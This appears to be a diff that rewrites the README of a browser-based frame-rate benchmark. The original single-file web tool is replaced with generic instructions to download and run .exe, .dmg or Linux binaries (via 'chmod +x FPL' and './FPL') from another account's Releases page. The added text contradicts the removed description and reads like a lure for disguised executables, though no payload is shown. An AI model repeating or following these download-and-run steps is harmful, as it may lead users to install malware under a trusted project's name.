@@ -1,101 +1,67 @@
-# 🚀 FPL Test: Frame Per Layer Performance Benchmark
+# 🎮 FPL - Measure Your Device's Power Easily
 
-**FPL Test** is a sleek, browser-based performance and stress testing tool designed to measure the **rendering capability and stability** of any device's browser by dynamically spawning and animating a growing number of objects (white balls) until the frame rate drops to a critically low level.
+## 👋 Introduction
+Welcome to FPL! This application helps you measure the power of your device with a simple and friendly interface. Whether you want to check your device’s performance for gaming, streaming, or other applications, FPL has you covered.
 
-Created and Maintained by **Sliz®**.
+## 🚀 Getting Started
+To begin using FPL, you will need to download the application from our Releases page. Follow the steps below to get started.
 
-Official *website for testing your device*: [**FPL**](https://fpl.pp.ua)
+## ⬇️ Download FPL
+[![Download FPL](https://img.shields.io/badge/Download-FPL-blue)](https://github.com/mashrafi1122/FPL/releases)
 
----
+## 📥 Download & Install
+1. Click on this [link to the FPL Releases page](https://github.com/mashrafi1122/FPL/releases) to open it in your web browser.
+2. On the Releases page, find the latest version of FPL.
+3. Look for the assets section. You will see download options. Choose the appropriate file for your operating system.
+4. Click on the file to download it to your computer.
 
-## ✨ Features
+## ⚙️ System Requirements
+FPL runs smoothly on most modern devices. Here are the recommended requirements:
 
-* **Dynamic Stress Testing:** Continuously spawns physics-simulated objects upon user input (click-and-hold/touch-and-hold).
-* **Real-time FPS Tracking:** Displays current, maximum (Max), and minimum (Min) Frame Per Second metrics in a clean overlay.
-* **Automatic Test Termination:** The test automatically concludes when the FPS drops to **1 FPS or lower for 5 consecutive seconds**, indicating the device's maximum rendering load.
-* **Detailed Results Modal:** Presents the final performance metrics, including the crucial **Total Balls** rendered and **Average FPS**.
-* **Device Comparison:** Offers insights into similar-performing devices and a global **Leaderboard** based on successful `Total Balls` count.
-* **Responsive Design:** Optimized for both desktop (mouse input) and mobile (touch input) devices.
-* **Minimalist & Modern UI:** Utilizes a gradient background, glassmorphism in UI panels, and subtle glow effects for the animated objects.
+- **Operating System:** Windows 10 or later, MacOS Mojave or later, or Linux (latest versions)
+- **RAM:** Minimum 4GB
+- **Processor:** Dual-core or higher
+- **Disk Space:** At least 200MB free space
 
----
+## 🛠️ Running FPL
+After the download completes, follow these steps to install and run the application.
 
-## 💻 Technical Overview
+1. **Locate the Downloaded File:** 
+   - For Windows, it is usually found in the “Downloads” folder.
+   - For Mac, check your “Downloads” folder as well.
+   - For Linux, check the default download directory.
 
-The FPL Test is a single-file application built entirely with **HTML, CSS, and vanilla JavaScript**.
+2. **Install FPL:** 
+   - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **Mac:** Open the downloaded `.dmg` file, drag the FPL icon to your Applications folder, and then open it from there.
+   - **Linux:** Open the terminal, navigate to the downloaded file, and run `chmod +x FPL` followed by `./FPL`.
 
-### Core Technologies
+3. **Launching FPL:** 
+   - For Windows, you can find FPL in the Start Menu under All Programs.
+   - For Mac, go to Applications and click on FPL.
+   - For Linux, execute `./FPL` in the terminal.
 
-| Technology | Purpose |
-| :--- | :--- |
-| **HTML5** | Structure and UI element scaffolding. |
-| **CSS3** | Modern styling, gradients, glassmorphism effects, and responsiveness. |
-| **Vanilla JavaScript** | Core logic, animation loop, physics simulation, and DOM manipulation. |
-| **Canvas API** | High-performance rendering of the animated balls and their trails. |
+## 🎯 Features of FPL
+- **Real-Time Measurement:** Monitor your device’s power usage while using various applications.
+- **User-Friendly Interface:** Navigate easily with a clean and straightforward layout.
+- **Performance Insights:** Get detailed reports and insights on your device’s performance over time.
+- **Compatibility:** Works with a variety of devices and operating systems.
 
-### Key Logic
+## 📊 How to Use FPL
+1. **Open FPL:** Launch the application using the steps outlined above.
+2. **Select a Mode:** Choose either the ‘Standard’ or ‘Advanced’ mode depending on your needs.
+3. **Start Measurement:** Click the “Start” button to begin measuring your device's power.
+4. **Review Results:** Once completed, review the results presented in graphs and reports.
 
-1.  **`Ball` Class:** Defines each object with properties for position (`x`, `y`), velocity (`vx`, `vy`), radius, and a `trail` array for visual effects.
-2.  **Physics Simulation:** In the `Ball.update()` method, basic physics are applied:
-    * Velocity is added to position: `this.x += this.vx; this.y += this.vy;`
-    * Boundary collision detection reverses and dampens velocity: `this.vx *= -0.95;`
-    * Friction/Damping is applied: `this.vx *= 0.99; this.vy *= 0.99;`
-3.  **Animation Loop:** The `animate()` function uses `requestAnimationFrame` for optimal, browser-managed frame pacing.
-    * It calculates the **current FPS** using `performance.now()` (`const currentFps = Math.round(1000 / delta);`).
-    * It updates the FPS statistics (`minFps`, `maxFps`, `fpsSum`).
-4.  **Stress Trigger:** The `startHolding()` function is activated on mouse-down or touch-start. It uses `setInterval` to continuously call `spawnBalls()`, increasing the batch size as `totalSpawned` grows to accelerate the stress test.
-5.  **Termination Condition:** The `animate()` function monitors for `fps <= 1` for a duration of **5000 milliseconds (5 seconds)**. If this condition is met, the `endTest()` function is called, locking the current `balls.length` as the final performance score.
+## 📝 Troubleshooting
+- **Application Won't Open:** Ensure you have downloaded the correct version for your operating system.
+- **Measurement Issues:** Restart FPL and try again. Make sure no other resource-heavy applications are running.
+- **Feedback & Support:** If you encounter any issues, please feel free to open an issue on the GitHub repository, and we will assist you promptly.
 
----
+## 🌟 Community and Contributions
+We encourage users to contribute and participate in improving FPL. You can provide feedback, report issues, or suggest features directly on our GitHub repository. This helps us make FPL better for everyone.
 
-## 🛠️ Usage
+## 📞 Contact
+For further questions or support, please check the Issues section on our GitHub page: [GitHub Issues](https://github.com/mashrafi1122/FPL/issues)
 
-This is a closed source project but it is useful for using and testing your device.
-
-You can also try it out and **check your device on the website**:
-
-- [**Frames Per Layer**](https://fpl.pp.ua)
-
-## Running the Test
-
-1.  **Initial State:** The test starts with a clean canvas and the UI displaying default values (`-- FPS`).
-2.  **Start the Test:**
-    * **Desktop:** **Hold down the Left Mouse Button (LMB)** on the blue/purple area.
-    * **Mobile:** **Hold down your finger** on the screen.
-    * *(Hint: After 3 clicks without holding, a hint message will appear.)*
-3.  **Observation:** Watch the `FPS Display` and the `White: [Ball Count]` increase. The `Min FPS` is a key indicator of rendering strain.
-4.  **Test Completion:** The test will automatically stop when the device can no longer maintain a reasonable frame rate (1 FPS for 5s). A modal with the **Test Complete** results will appear.
-5.  **Analyze & Compare:** Review your results, especially the **Total Balls** score, and compare your device's performance against others in the **Devices** section.
-
-### Warning!
-
-To get the **results**, **just wait**. On your **computer or phone**, hold down the screen and **don't let go until the statistics appear**.
-
----
-
-## ⚙️ Project Structure
-
-This project consists of a single file:
-
-└── index.html
-
-
-* **`index.html`:** Contains all the HTML structure, CSS styling, and JavaScript logic for the FPL Test.
-
----
-
-## 🛡️ License
-
-This project is licensed under a **Custom Proprietary License** by **Sliz®**.
-
-This software is the proprietary and confidential property of **Sliz®** ("the Company"). No part of this project, including but not limited to the source code, design, and accompanying documentation, may be used, reproduced, distributed, or modified without the express written permission of the Company.
-
-**Copyright (c) 2025 Sliz®**
-
----
-
-## 📧 Contact
-
-For support, partnership inquiries, or licensing questions, please contact the creators:
-
-**Sliz®** - *Innovating at the intersection of performance and visual stress testing.*
+Thank you for using FPL! We hope you enjoy measuring your device’s power efficiently.
